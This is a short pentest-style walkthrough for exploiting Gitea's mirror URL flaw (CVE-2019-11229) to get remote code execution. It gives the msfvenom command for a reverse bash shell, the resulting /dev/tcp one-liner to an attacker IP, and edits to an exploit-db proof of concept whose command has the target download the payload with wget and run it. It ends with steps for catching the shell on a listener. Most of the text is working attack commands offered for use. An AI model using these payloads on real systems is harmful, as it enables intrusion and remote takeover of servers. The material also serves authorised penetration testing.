 ### Mishandle mirror url setting on production
 
 #### affect : Gitea before 1.7.6 and 1.8.x before 1.8-RC3
 
> always remember to read and craft your payload carefully before run and hurt service

1. get valid credential for gitea service (old or newly create user)

2. get this [cve-poc](https://www.exploit-db.com/exploits/49383) file from exploit-db

3. making tcp reverse shell payload by bash script with msfvenom
``` bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.224 LPORT=21 -f raw > reverse.sh
```

> inspect it before use
``` bash
cat reverse.sh

bash -c '0<&50-;exec 50<>/dev/tcp/192.168.45.224/21;sh <&50 >&50 2>&50'
```

4. start http server in port that you want to serve your payload.

>  but carefully choose because this exploit use mishandle mirror url setting. like if it try to send on wrong port. or port that got filtered. it may not close itself. and you need to ask client to revert it. and your client hate you. that  process service just misbehave by one missed exploit.


5. fixing variable value from exploit file

``` py
# gitea default port is 3000; adjust it from gitea port
USERNAME = "username"
PASSWORD = "password"
HOST_ADDR = '<attacker_host_ip>'
HOST_PORT = 3000
URL = 'http://<target_host_ip>:3000'
CMD = 'wget http://<attacker_ip>:<http-serve-port>/reverse.sh && bash ./reverse.sh'

```

6. open listener on port that you adjust from bash payload you craft with msfvenom

7. run exploit

```
python3 CVE-2019-11229-exploit.py
```

8. check your listener for reverse shell connection